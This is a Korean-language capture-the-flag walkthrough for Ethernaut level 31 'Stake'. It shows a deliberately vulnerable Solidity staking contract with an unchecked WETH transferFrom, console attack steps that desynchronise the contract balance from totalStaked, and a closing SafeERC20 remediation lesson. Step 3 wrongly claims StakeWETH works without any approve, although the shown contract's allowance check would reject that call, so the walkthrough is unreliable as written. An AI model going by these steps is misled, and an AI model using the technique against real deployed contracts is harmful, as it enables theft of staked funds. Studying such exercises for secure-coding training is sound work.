# Ethernaut Level 31 - Stake

## 문제 설명

스테이킹 컨트랙트의 여러 취약점을 이용해 아래 조건을 모두 충족시키는 것이 목표이다.

```
1. address(this).balance < totalStaked
2. UserStake[player] > 0
3. Stakers[player] == true
```

---

## 컨트랙트 분석

```solidity
contract Stake {
    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }

    function StakeWETH(uint256 amount) public returns (bool) {
        require(amount > 0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(
            abi.encodeWithSelector(0xdd62ed3e, msg.sender, address(this))
        );
        require(convert(allowance) >= amount, "How dare you");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        // ← WETH.transferFrom 반환값 미확인!
        (bool transfered,) = WETH.call(
            abi.encodeWithSelector(0x23b872dd, msg.sender, address(this), amount)
        );
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool) {
        require(UserStake[msg.sender] >= amount, "Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success,) = payable(msg.sender).call{value: amount}("");
        require(success, "Couldn't transfer ETH");
        return true;
    }
}
```

---

## 취약점 분석

### 1. WETH transferFrom 반환값 미확인

`StakeWETH()`는 `transferFrom` 성공 여부와 관계없이
`UserStake`와 `totalStaked`를 증가시킨다.

→ WETH approve 없이도 `UserStake` 기록 가능

### 2. 잔액 불일치 유발

```
ETH 스테이킹: balance ↑, totalStaked ↑  (일치)
WETH 스테이킹: balance 그대로, totalStaked ↑  (불일치!)
ETH Unstake: balance ↓, totalStaked ↓  (일치)
```

WETH 스테이킹 후 ETH Unstake하면:
`balance < totalStaked` 조건 충족

---

## 공격 단계

### Step 1 — WETH 주소 확인

```js
let weth = await contract.WETH()
```

### Step 2 — ETH 스테이킹

```js
// 컨트랙트에 실제 ETH를 넣어줌
await contract.StakeETH({ value: toWei("0.0011") })
```

### Step 3 — WETH approve 없이 StakeWETH 호출

```js
// approve를 하지 않아 transferFrom은 실패하지만
// UserStake와 totalStaked는 증가함
await contract.StakeWETH(toWei("0.0011"))
```

### Step 4 — ETH Unstake

```js
// 실제 ETH 출금 → balance 감소
// totalStaked는 그대로 → balance < totalStaked 충족
await contract.Unstake(toWei("0.0011"))
```

### Step 5 — 조건 확인

```js
// 1. balance < totalStaked
let balance = await getBalance(contract.address)
let totalStaked = await contract.totalStaked()
console.log(balance, totalStaked.toString())
// balance < totalStaked ✅

// 2. UserStake[player] > 0
(await contract.UserStake(player)).toString()
// → "0.0011 ETH worth" ✅

// 3. Stakers[player] == true
await contract.Stakers(player)
// → true ✅
```

---

## 핵심 교훈

```solidity
// ❌ 위험 - 반환값 미확인
(bool transfered,) = WETH.call(
    abi.encodeWithSelector(0x23b872dd, ...)
);
// transfered를 확인하지 않음

// ✅ 안전 - SafeERC20 사용
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
IERC20(WETH).safeTransferFrom(msg.sender, address(this), amount);
```

- ERC20 `transferFrom` 반환값은 반드시 확인해야 함
- `SafeERC20`의 `safeTransferFrom` 사용 권장
- ETH 전송 실패 시 상태 롤백 로직 필요
- Checks-Effects-Interactions 패턴 항상 준수
